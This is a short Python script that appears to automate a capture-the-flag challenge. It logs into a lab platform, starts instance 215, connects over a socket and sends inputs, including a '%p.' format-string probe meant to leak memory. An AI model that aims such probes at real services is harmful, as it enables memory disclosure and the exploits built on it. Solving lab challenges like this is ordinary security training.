import sys, re, json, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.4)
cy.login()
cy.req("PUT", "/api/challenges/215/instance/?source=library")
host = port = None
for _ in range(10):
    time.sleep(0.8)
    st, b = cy.req("GET", "/api/challenges/215/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d{2,5})", d.get("description") or "")
    if m:
        host, port = m.group(1), int(m.group(2))
        break
print("cible:", host, port)


def run(a, bb, c, wait=3.0):
    try:
        s = socket.create_connection((host, port), timeout=15)
        s.settimeout(wait)
        data = b""
        t0 = time.time()
        while time.time() - t0 < 2:
            try:
                ch = s.recv(2048)
                if not ch:
                    break
                data += ch
                if data.count(b": ") >= 1:
                    break
            except socket.timeout:
                break
        for payload in (a, bb, c):
            s.sendall(payload.encode() + b"\n")
            time.sleep(0.25)
        t0 = time.time()
        while time.time() - t0 < wait:
            try:
                ch = s.recv(4096)
                if not ch:
                    break
                data += ch
            except socket.timeout:
                break
        s.close()
        return data.decode("latin-1", "replace")
    except Exception as e:
        return "ERR " + type(e).__name__


print("=== 1/1/1 ===")
print(repr(run("1", "1", "1")[:400]))
print("=== 1/1/%p x12 ===")
print(repr(run("1", "1", "%p." * 12)[:500]))
